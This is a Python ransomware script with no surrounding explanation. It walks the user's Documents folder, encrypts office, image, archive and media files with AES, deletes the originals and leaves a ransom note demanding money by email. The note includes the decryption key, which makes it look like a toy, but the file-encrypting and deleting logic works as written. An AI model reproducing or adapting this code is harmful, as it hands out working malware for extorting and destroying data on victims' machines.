import os, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

directory = os.path.expanduser('~/Documents')

info_file = os.path.join(directory,"README_OR_ELSE.txt")

extensions = (".txt", ".doc", ".docx", ".pdf", ".rtf",
              ".xlsx", ".xls", ".csv", ".ppt", ".pptx",
              ".mdb", ".accdb", ".jpg", ".jpeg", ".png",
              ".gif", ".bmp", ".zip", ".rar", ".7z",
              ".tar", ".gz", ".tgz", ".mp3", ".wav",
              ".mp4", ".avi", ".mkv", ".mov", ".wmv")

def find_files():
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(extensions) and filename != os.path.basename(info_file):
                files.append(os.path.join(root, filename))
    return files

def aes_operation(key, data, mode):
    backend = default_backend()
    iv = os.urandom(16) if mode == 'enc' else data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=backend)
    processor = cipher.encryptor() if mode == 'enc' else cipher.decryptor()
    return processor, iv

def decrypt_files(input, files):
    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        try:
            key = base64.b64decode(input.encode('utf-8'))
            decryptor, _ = aes_operation(key, data, 'dec')
            decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
            with open(file + ".tere", "wb") as f:
                f.write(decrypted_data)
            os.remove(file)
            os.rename(file + ".tere", file)
        except: 
            print("Wrong code buddy.")
            main()
    os.remove(info_file)
    os._exit(1)

def main():
    files = find_files()

    if os.path.exists(info_file):
        user_input = input(f"Enter the correct code from {info_file}: ")
        decrypt_files(user_input, files)
    else:
        key = os.urandom(32)
        correct_code = base64.b64encode(key).decode('utf-8')

        for file in files:
            with open(file, "rb") as f:
                data = f.read()
            encryptor, iv = aes_operation(key, data, 'enc')
            with open(file + ".tere", "wb") as f:
                f.write(iv + (encryptor.update(data) + encryptor.finalize()))
            os.remove(file)
            os.rename(file + ".tere", file)

        info_text = f'''Unlucky! :/ You clicked the funny exe file. All of your files have now been changed! 
To get them back to normal, send big money to email@email.com

CODE HERE:
{correct_code}

Enter the key in the program to get your files back.'''
    
        with open(info_file, "w") as f:
            f.write(info_text)

        user_input = input(f"Enter code from {info_file}: ")
        decrypt_files(user_input, files)

if __name__ == "__main__":
    main()